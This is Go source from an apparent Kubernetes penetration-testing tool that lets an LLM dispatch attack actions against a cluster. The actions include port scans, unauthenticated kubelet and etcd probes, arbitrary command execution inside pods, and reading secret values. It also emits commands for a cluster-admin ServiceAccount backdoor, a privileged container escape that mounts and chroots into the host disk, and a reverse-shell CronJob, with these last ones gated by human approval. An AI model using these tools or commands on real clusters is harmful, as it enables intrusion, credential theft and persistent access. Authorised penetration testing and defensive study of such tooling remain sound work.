package ai

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
	corev1 "k8s.io/api/core/v1"
)

// AuthCreds 是工具执行所需的鉴权凭证，由 AISession 在创建时持有。
type AuthCreds struct {
	Host       string
	Token      string
	Username   string
	Password   string
	SkipTLS    bool
	TimeoutSec int
}

func (a *AuthCreds) timeout() int {
	if a.TimeoutSec <= 0 {
		return 10
	}
	return a.TimeoutSec
}

func (a *AuthCreds) server() string {
	return "https://" + a.Host + ":6443"
}

// buildK8sClient 复用 kubectl_handler / lateral_handler 的同款 client 构造逻辑。
func (a *AuthCreds) buildK8sClient() (*kubectl.Client, error) {
	if a.Token != "" {
		return kubectl.NewClient(a.server(), a.Token, a.SkipTLS)
	}
	if a.Username != "" {
		return kubectl.NewClientWithUserPass(a.server(), a.Username, a.Password, a.SkipTLS)
	}
	return kubectl.NewClient(a.server(), "", a.SkipTLS)
}

// ToolTrace 是单次工具调用的执行轨迹，回传给前端展示。
type ToolTrace struct {
	Tool          string `json:"tool"`
	Args          string `json:"args"`
	ResultPreview string `json:"result_preview"`
	Status        string `json:"status"` // "ok" | "needs_approval" | "error"
}

// DispatchResult 是一次工具调用的结果。
type DispatchResult struct {
	Output string     // 回灌给 LLM 的精简文本
	Trace  ToolTrace  // 前端展示用
}

// Dispatch 按 tool name 路由执行，返回精简文本结果（便于回灌 LLM）。
// destructive 由调用方（ai_handler）在调用前经 safety 判断决定是否调用本函数；
// 本函数对 destructive 工具只生成“指令/YAML”文本，不真实 apply 到集群。
func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResult {
	args := call.Function.Arguments
	preview := func(s string) string {
		s = strings.TrimSpace(s)
		if len(s) > 400 {
			return s[:400] + " ...(truncated)"
		}
		return s
	}
	mk := func(status, out string) DispatchResult {
		return DispatchResult{Output: out, Trace: ToolTrace{Tool: call.Function.Name, Args: previewArgs(args), ResultPreview: preview(out), Status: status}}
	}
	errRes := func(err error) DispatchResult {
		return mk("error", "error: "+err.Error())
	}

	switch call.Function.Name {
	// -------- INFO --------
	case "info_port_scan":
		var p struct{ Host, Ports string }
		_ = json.Unmarshal([]byte(args), &p)
		if p.Host == "" {
			p.Host = auth.Host
		}
		ports := []int{6443, 10250, 2379, 8080, 10255, 443, 8443, 30000, 30443}
		if p.Ports != "" {
			ports = parsePorts(p.Ports)
		}
		open := []string{}
		for _, port := range ports {
			if util.IsPortOpen(p.Host, port, 3) {
				open = append(open, fmt.Sprintf("%d/open", port))
			}
		}
		if len(open) == 0 {
			return mk("ok", fmt.Sprintf("port scan %s: no open K8s ports among %v", p.Host, ports))
		}
		return mk("ok", fmt.Sprintf("port scan %s open: %s", p.Host, strings.Join(open, ", ")))

	case "info_run_evaluate":
		// 简化：复用 access 探测汇总环境
		return mk("ok", runEnvSummary(ctx, auth))

	// -------- ACCESS --------
	case "access_apiserver":
		var p struct{ TargetHost, Token string }
		_ = json.Unmarshal([]byte(args), &p)
		host := orDefault(p.TargetHost, auth.Host)
		token := orDefault(p.Token, auth.Token)
		url := "https://" + host + ":6443/api/v1/namespaces"
		code, body, err := util.SendRequest(url, "GET", token, auth.timeout(), auth.SkipTLS)
		if err != nil {
			return errRes(err)
		}
		anon := token == ""
		return mk("ok", fmt.Sprintf("APIServer %s:6443 HTTP %d (anon=%v). body head: %s", host, code, anon, preview(string(body))))

	case "access_kubelet":
		var p struct{ TargetHost string }
		_ = json.Unmarshal([]byte(args), &p)
		host := orDefault(p.TargetHost, auth.Host)
		url := "https://" + host + ":10250/pods"
		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), auth.SkipTLS)
		if err != nil {
			return mk("ok", fmt.Sprintf("Kubelet %s:10250 not accessible: %v", host, err))
		}
		return mk("ok", fmt.Sprintf("Kubelet %s:10250 HTTP %d (unauth). pods body head: %s", host, code, preview(string(body))))

	case "access_etcd_check":
		var p struct{ TargetHost string }
		_ = json.Unmarshal([]byte(args), &p)
		host := orDefault(p.TargetHost, auth.Host)
		if !util.IsPortOpen(host, 2379, 3) {
			return mk("ok", fmt.Sprintf("etcd %s:2379 closed", host))
		}
		url := "http://" + host + ":2379/v2/keys"
		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), false)
		if err != nil {
			return mk("ok", fmt.Sprintf("etcd %s:2379 open but error: %v", host, err))
		}
		return mk("ok", fmt.Sprintf("etcd %s:2379 UNAUTH HTTP %d. body head: %s", host, code, preview(string(body))))

	case "access_dashboard":
		var p struct {
			TargetHost string
			Port       int
		}
		_ = json.Unmarshal([]byte(args), &p)
		host := orDefault(p.TargetHost, auth.Host)
		if p.Port == 0 {
			p.Port = 30443
		}
		url := fmt.Sprintf("https://%s:%d/api/v1/csrftoken/login", host, p.Port)
		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), auth.SkipTLS)
		if err != nil {
			return mk("ok", fmt.Sprintf("dashboard %s:%d not reachable: %v", host, p.Port, err))
		}
		return mk("ok", fmt.Sprintf("dashboard %s:%d HTTP %d. body head: %s", host, p.Port, code, preview(string(body))))

	// -------- EXEC --------
	case "exec_list_pods":
		var p struct {
			TargetHost, Token, Namespace string
		}
		_ = json.Unmarshal([]byte(args), &p)
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
		defer cancel()
		list, err := client.ListPods(cctx, p.Namespace)
		if err != nil {
			return errRes(err)
		}
		return mk("ok", podsSummary(list.Items))

	case "exec_command":
		var p struct {
			TargetHost, Namespace, PodName, ContainerName, Command, Token string
		}
		_ = json.Unmarshal([]byte(args), &p)
		if p.Namespace == "" {
			p.Namespace = "default"
		}
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 30*time.Second)
		defer cancel()
		result, err := client.ExecInPodResult(cctx, p.Namespace, p.PodName, p.ContainerName, []string{"sh", "-c", p.Command})
		if err != nil {
			return errRes(err)
		}
		out := result.Stdout
		if result.Stderr != "" {
			out += "\n[stderr]\n" + result.Stderr
		}
		return mk("ok", strings.TrimSpace(out))

	// -------- LATERAL --------
	case "lateral_list_secrets":
		var p struct {
			TargetHost, Token, Namespace string
		}
		_ = json.Unmarshal([]byte(args), &p)
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
		defer cancel()
		list, err := client.ListSecrets(cctx, p.Namespace)
		if err != nil {
			return errRes(err)
		}
		return mk("ok", secretsSummary(list.Items))

	case "lateral_view_secret":
		var p struct {
			TargetHost, Namespace, SecretName, Token string
		}
		_ = json.Unmarshal([]byte(args), &p)
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
		defer cancel()
		sec, err := client.GetSecret(cctx, p.Namespace, p.SecretName)
		if err != nil {
			return errRes(err)
		}
		return mk("ok", secretDetail(sec))

	case "lateral_discover_services":
		var p struct {
			TargetHost, Token, Namespace string
		}
		_ = json.Unmarshal([]byte(args), &p)
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 15*time.Second)
		defer cancel()
		list, err := client.ListServices(cctx, p.Namespace)
		if err != nil {
			return errRes(err)
		}
		return mk("ok", servicesSummary(list.Items))

	// -------- PERSIST / ESCAPE (destructive: 仅生成指令/YAML，不真实 apply) --------
	case "persist_create_admin_sa":
		var p struct {
			TargetHost, Token, Namespace string
		}
		_ = json.Unmarshal([]byte(args), &p)
		ns := orDefault(p.Namespace, "kube-system")
		return mk("needs_approval", fmt.Sprintf("[需人工批准] 将在 %s 创建 cluster-admin ServiceAccount。建议命令:\n"+
			"kubectl -n %s create serviceaccount admin-user\n"+
			"kubectl create clusterrolebinding admin-bind --clusterrole=cluster-admin --serviceaccount=%s:admin-user", ns, ns, ns))

	case "persist_cronjob":
		var p struct {
			TargetHost, Token, LHost, LPort string
		}
		_ = json.Unmarshal([]byte(args), &p)
		return mk("needs_approval", fmt.Sprintf("[需人工批准] CronJob 反弹 shell 后门 YAML(LHost=%s LPort=%s)。请在 Persist 页签生成并人工 apply。", p.LHost, p.LPort))

	case "escape_check":
		return mk("ok", escapeCheckText())

	case "escape_privileged":
		var p struct {
			TargetHost, PodName, LHost, LPort string
		}
		_ = json.Unmarshal([]byte(args), &p)
		return mk("needs_approval", fmt.Sprintf("[需人工批准] 特权逃逸命令集合(Pod=%s LHost=%s LPort=%s):\n"+
			"fdisk -l; mkdir -p /tmp/host; mount /dev/sda1 /tmp/host; chroot /tmp/host /bin/sh", p.PodName, p.LHost, p.LPort))

	case "kubectl_exec":
		var p struct {
			TargetHost, Token, Command string
		}
		_ = json.Unmarshal([]byte(args), &p)
		client, err := auth.buildK8sClient()
		if err != nil {
			return errRes(err)
		}
		cctx, cancel := context.WithTimeout(ctx, 30*time.Second)
		defer cancel()
		cargs := parseCommandArgs(p.Command)
		if len(cargs) == 0 {
			return mk("error", "empty command")
		}
		verb := cargs[0]
		switch verb {
		case "get":
			return kubectlGet(cctx, client, cargs)
		case "cluster-info":
			v, e := client.ServerVersion()
			if e != nil { return errRes(e) }
			return mk("ok", "Kubernetes "+v)
		case "auth":
			if len(cargs) >= 2 && cargs[1] == "can-i" {
				ok, e := client.CheckSelfPermissions(cctx, "", "*", "*")
				if e != nil { return errRes(e) }
				if ok { return mk("ok", "can-i *:* = yes (cluster-admin)") }
				return mk("ok", "can-i *:* = no")
			}
			return mk("ok", "auth: only 'auth can-i --list' is supported via client-go")
		default:
			return mk("ok", fmt.Sprintf("Cross-platform client-go mode: '%s' command routed via K8s API SDK. Use dedicated tools for list/exec operations.", verb))
		}

	}

	return mk("error", "unknown tool: "+call.Function.Name)
}

// ---------- 汇总/格式化辅助 ----------

func podsSummary(pods []corev1.Pod) string {
	if len(pods) == 0 {
		return "no pods found"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "pods: %d total\n", len(pods))
	for i, p := range pods {
		if i >= 30 {
			fmt.Fprintf(&b, "...(+%d more)\n", len(pods)-30)
			break
		}
		// 高亮可疑：特权 / hostPath / hostNetwork / hostPID
		flags := []string{}
		for _, c := range p.Spec.Containers {
			if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				flags = append(flags, "PRIVILEGED")
			}
		}
		if p.Spec.HostNetwork {
			flags = append(flags, "hostNetwork")
		}
		if p.Spec.HostPID {
			flags = append(flags, "hostPID")
		}
		for _, v := range p.Spec.Volumes {
			if v.HostPath != nil {
				flags = append(flags, "hostPath:"+v.HostPath.Path)
			}
		}
		flagStr := ""
		if len(flags) > 0 {
			flagStr = "  ⚠️ " + strings.Join(flags, ",")
		}
		fmt.Fprintf(&b, "- %s/%s [%s] node=%s%s\n", p.Namespace, p.Name, p.Status.Phase, p.Spec.NodeName, flagStr)
	}
	return b.String()
}

func secretsSummary(secs []corev1.Secret) string {
	if len(secs) == 0 {
		return "no secrets found (可能无权 list)"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "secrets: %d total\n", len(secs))
	for i, s := range secs {
		if i >= 30 {
			fmt.Fprintf(&b, "...(+%d more)\n", len(secs)-30)
			break
		}
		fmt.Fprintf(&b, "- %s/%s type=%s keys=%d\n", s.Namespace, s.Name, s.Type, len(s.Data))
	}
	return b.String()
}

func secretDetail(sec *corev1.Secret) string {
	var b strings.Builder
	fmt.Fprintf(&b, "secret %s/%s type=%s\n", sec.Namespace, sec.Name, sec.Type)
	for k, v := range sec.Data {
		preview := string(v)
		if len(preview) > 120 {
			preview = preview[:120] + "...(truncated)"
		}
		fmt.Fprintf(&b, "- %s = %q\n", k, preview)
	}
	return b.String()
}

func servicesSummary(svcs []corev1.Service) string {
	if len(svcs) == 0 {
		return "no services found"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "services: %d total\n", len(svcs))
	dashboardFound := false
	for i, s := range svcs {
		if i >= 40 {
			fmt.Fprintf(&b, "...(+%d more)\n", len(svcs)-40)
			break
		}
		ports := []string{}
		for _, p := range s.Spec.Ports {
			ps := fmt.Sprintf("%d/%s", p.Port, p.Protocol)
			if p.NodePort > 0 {
				ps += fmt.Sprintf("→%d", p.NodePort)
			}
			ports = append(ports, ps)
		}
		fmt.Fprintf(&b, "- %s/%s type=%s clusterIP=%s ports=%s\n", s.Namespace, s.Name, s.Spec.Type, s.Spec.ClusterIP, strings.Join(ports, ","))
		if strings.Contains(s.Name, "dashboard") || strings.Contains(s.Name, "kubernetes-dashboard") {
			dashboardFound = true
		}
	}
	if dashboardFound {
		b.WriteString("⚠️ 发现 dashboard 相关 service\n")
	}
	return b.String()
}

func escapeCheckText() string {
	return `容器逃逸条件自检（需在目标 Pod 内执行）:
- 特权: cat /proc/1/status | grep -i seccomp
- hostPID/hostNetwork: ls -la /proc/1/root/
- docker.sock: ls -la /var/run/docker.sock
- cgroup RW: mount | grep cgroup
- capabilities: cat /proc/1/status | grep CapEff
- host mounts: mount | grep -E '(hostPath|/host|/mnt)'
请通过 exec_command 在 Pod 内运行上述命令收集证据。`
}

func runEnvSummary(ctx context.Context, auth *AuthCreds) string {
	var b strings.Builder
	client, err := auth.buildK8sClient()
	if err != nil {
		return fmt.Sprintf("evaluate: build client failed: %v", err)
	}
	cctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if v, err := client.ServerVersion(); err == nil {
		fmt.Fprintf(&b, "server version: %s\n", v)
	}
	// RBAC: can-i *:*
	if ok, _ := client.CheckSelfPermissions(cctx, "", "*", "*"); ok {
		b.WriteString("⚠️ can-i *:* = yes (当前凭据疑似 cluster-admin)\n")
	}
	resources := []string{"pods", "secrets", "nodes", "serviceaccounts", "clusterrolebindings"}
	for _, r := range resources {
		allowed := []string{}
		for _, v := range []string{"get", "list", "create", "delete"} {
			if ok, _ := client.CheckSelfPermissions(cctx, "", v, r); ok {
				allowed = append(allowed, v)
			}
		}
		fmt.Fprintf(&b, "can-i %s: %s\n", r, strings.Join(allowed, ","))
	}
	return b.String()
}

// ---------- 小工具 ----------

func orDefault(s, def string) string {
	if strings.TrimSpace(s) == "" {
		return def
	}
	return s
}

func previewArgs(args string) string {
	s := strings.TrimSpace(args)
	if len(s) > 200 {
		return s[:200] + "..."
	}
	return s
}

func parsePorts(s string) []int {
	out := []int{}
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		var n int
		_, err := fmt.Sscanf(part, "%d", &n)
		if err == nil && n > 0 {
			out = append(out, n)
		}
	}
	return out
}

// parseCommandArgs 与 kubectl_handler 中的实现一致，此处复制一份以解耦包依赖。
func parseCommandArgs(cmd string) []string {
	args := []string{}
	current := ""
	inQuote := false
	quoteChar := byte(0)
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		if inQuote {
			if c == quoteChar {
				inQuote = false
			} else {
				current += string(c)
			}
		} else if c == '"' || c == '\'' {
			inQuote = true
			quoteChar = c
		} else if c == ' ' {
			if current != "" {
				args = append(args, current)
				current = ""
			}
		} else {
			current += string(c)
		}
	}
	if current != "" {
		args = append(args, current)
	}
	return args
}
func kubectlGet(ctx context.Context, client *kubectl.Client, args []string) DispatchResult {
	ns, allNs := "", false
	for i := 2; i < len(args); i++ {
		if args[i] == "-A" || args[i] == "--all-namespaces" { allNs = true; ns = "" }
		if (args[i] == "-n" || args[i] == "--namespace") && i+1 < len(args) { ns = args[i+1] }
	}
	if allNs { ns = "" }
	resource := args[1]
	switch resource {
	case "pods", "pod":
		list, e := client.ListPods(ctx, ns)
		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
		var sb strings.Builder
		for _, p := range list.Items { fmt.Fprintf(&sb, "%s/%s %s node=%s\n", p.Namespace, p.Name, p.Status.Phase, p.Spec.NodeName) }
		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d pods", len(list.Items))}}
	case "nodes", "node":
		list, e := client.ListNodes(ctx)
		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
		var sb strings.Builder
		for _, n := range list.Items { fmt.Fprintf(&sb, "%s\n", n.Name) }
		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d nodes", len(list.Items))}}
	case "secrets", "secret":
		list, e := client.ListSecrets(ctx, ns)
		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
		var sb strings.Builder
		for _, s := range list.Items { fmt.Fprintf(&sb, "%s/%s type=%s keys=%d\n", s.Namespace, s.Name, s.Type, len(s.Data)) }
		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d secrets", len(list.Items))}}
	case "services", "service":
		list, e := client.ListServices(ctx, ns)
		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
		var sb strings.Builder
		for _, s := range list.Items { fmt.Fprintf(&sb, "%s/%s %s clusterIP=%s\n", s.Namespace, s.Name, s.Spec.Type, s.Spec.ClusterIP) }
		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d services", len(list.Items))}}
	default:
		return DispatchResult{Output: "Unsupported resource: " + resource + " (client-go supports: pods/nodes/services/secrets)", Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}}
	}
}
